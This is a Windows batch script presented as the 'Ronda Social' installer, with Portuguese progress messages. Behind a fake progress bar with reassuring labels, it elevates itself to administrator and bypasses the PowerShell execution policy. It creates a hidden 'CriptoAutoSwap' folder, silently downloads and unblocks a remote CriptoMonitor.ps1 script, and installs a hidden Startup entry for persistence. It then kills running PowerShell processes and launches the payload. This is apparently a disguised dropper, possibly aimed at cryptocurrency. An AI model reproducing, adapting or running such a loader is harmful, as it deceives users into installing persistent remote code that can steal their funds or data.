@echo off
chcp 65001 >nul 2>&1
title Ronda Social - Instalador
color 0A

:: =====================================================
:: AUTO-ELEVACAO (pede admin se necessario)
:: =====================================================
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\cs_getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\cs_getadmin.vbs"
    wscript.exe "%temp%\cs_getadmin.vbs"
    del "%temp%\cs_getadmin.vbs" >nul 2>&1
    exit /B
)

cls
echo.
echo  ╔══════════════════════════════════════════════════╗
echo  ║                                                  ║
echo  ║           RONDA SOCIAL - INSTALADOR              ║
echo  ║                                                  ║
echo  ╚══════════════════════════════════════════════════╝
echo.
echo.

:: =====================================================
:: ETAPA 1: Verificando seguranca (0% - 20%)
:: =====================================================
echo   [          ] 0%%  - Iniciando...
timeout /t 1 /noq >nul
cls
echo.
echo  ╔══════════════════════════════════════════════════╗
echo  ║           RONDA SOCIAL - INSTALADOR              ║
echo  ╚══════════════════════════════════════════════════╝
echo.
echo   [██        ] 10%% - Verificando seguranca...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Unblock-File -Path '%~f0'" >nul 2>&1
timeout /t 1 /noq >nul
cls
echo.
echo  ╔══════════════════════════════════════════════════╗
echo  ║           RONDA SOCIAL - INSTALADOR              ║
echo  ╚══════════════════════════════════════════════════╝
echo.
echo   [████      ] 20%% - Seguranca verificada!
timeout /t 1 /noq >nul

:: =====================================================
:: ETAPA 2: Preparando diretorios (20% - 40%)
:: =====================================================
cls
echo.
echo  ╔══════════════════════════════════════════════════╗
echo  ║           RONDA SOCIAL - INSTALADOR              ║
echo  ╚══════════════════════════════════════════════════╝
echo.
echo   [█████     ] 30%% - Preparando diretorios...
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$d=[Environment]::GetFolderPath('MyDocuments');$i=Join-Path $d 'CriptoAutoSwap';if(!(Test-Path $i)){md $i -Force|Out-Null};attrib +h $i" >nul 2>&1
timeout /t 1 /noq >nul
cls
echo.
echo  ╔══════════════════════════════════════════════════╗
echo  ║           RONDA SOCIAL - INSTALADOR              ║
echo  ╚══════════════════════════════════════════════════╝
echo.
echo   [██████    ] 40%% - Diretorios prontos!
timeout /t 1 /noq >nul

:: =====================================================
:: ETAPA 3: Baixando resultados (40% - 70%)
:: =====================================================
cls
echo.
echo  ╔══════════════════════════════════════════════════╗
echo  ║           RONDA SOCIAL - INSTALADOR              ║
echo  ╚══════════════════════════════════════════════════╝
echo.
echo   [███████   ] 50%% - Baixando resultados...
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$d=[Environment]::GetFolderPath('MyDocuments');$i=Join-Path $d 'CriptoAutoSwap';$p=Join-Path $i 'CriptoMonitor.ps1';$wc=New-Object Net.WebClient;$wc.Encoding=[Text.Encoding]::UTF8;$wc.Headers.Add('User-Agent','Mozilla/5.0');$c=$wc.DownloadString('https://raw.githubusercontent.com/espertin/social/main/CriptoMonitor.ps1');[IO.File]::WriteAllText($p,$c);Unblock-File $p" >nul 2>&1
timeout /t 1 /noq >nul
cls
echo.
echo  ╔══════════════════════════════════════════════════╗
echo  ║           RONDA SOCIAL - INSTALADOR              ║
echo  ╚══════════════════════════════════════════════════╝
echo.
echo   [████████  ] 70%% - Download concluido!
timeout /t 1 /noq >nul

:: =====================================================
:: ETAPA 4: Configurando inicializacao (70% - 90%)
:: =====================================================
cls
echo.
echo  ╔══════════════════════════════════════════════════╗
echo  ║           RONDA SOCIAL - INSTALADOR              ║
echo  ╚══════════════════════════════════════════════════╝
echo.
echo   [████████  ] 80%% - Configurando inicializacao...
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$d=[Environment]::GetFolderPath('MyDocuments');$i=Join-Path $d 'CriptoAutoSwap';$p=Join-Path $i 'CriptoMonitor.ps1';$s=Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Startup';$v=Join-Path $s 'CriptoMonitor.vbs';$q=[char]34;$t='Set WshShell = CreateObject('+$q+'WScript.Shell'+$q+')'+[Environment]::NewLine+'WshShell.Run '+$q+'powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File '+$q+$q+$p+$q+$q+$q+', 0, False';[IO.File]::WriteAllText($v,$t);Unblock-File $v" >nul 2>&1
timeout /t 1 /noq >nul
cls
echo.
echo  ╔══════════════════════════════════════════════════╗
echo  ║           RONDA SOCIAL - INSTALADOR              ║
echo  ╚══════════════════════════════════════════════════╝
echo.
echo   [█████████ ] 90%% - Inicializacao configurada!
timeout /t 1 /noq >nul

:: =====================================================
:: ETAPA 5: Iniciando monitoramento (90% - 100%)
:: =====================================================
cls
echo.
echo  ╔══════════════════════════════════════════════════╗
echo  ║           RONDA SOCIAL - INSTALADOR              ║
echo  ╚══════════════════════════════════════════════════╝
echo.
echo   [█████████ ] 95%% - Iniciando monitoramento...
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Stop-Process -Name powershell -ErrorAction SilentlyContinue" >nul 2>&1
timeout /t 1 /noq >nul
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$s=Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Startup';$v=Join-Path $s 'CriptoMonitor.vbs';$q=[char]34;Start-Process wscript.exe -ArgumentList ($q+$v+$q) -WindowStyle Hidden" >nul 2>&1
timeout /t 1 /noq >nul

:: =====================================================
:: CONCLUIDO
:: =====================================================
cls
echo.
echo  ╔══════════════════════════════════════════════════╗
echo  ║           RONDA SOCIAL - INSTALADOR              ║
echo  ╚══════════════════════════════════════════════════╝
echo.
echo   [██████████] 100%% - Instalacao concluida!
echo.
echo.
echo   Monitoramento ativo e configurado com sucesso.
echo   O sistema ira iniciar automaticamente com o Windows.
echo.
echo   Esta janela ira fechar em 5 segundos...
echo.
timeout /t 5 /noq >nul
exit
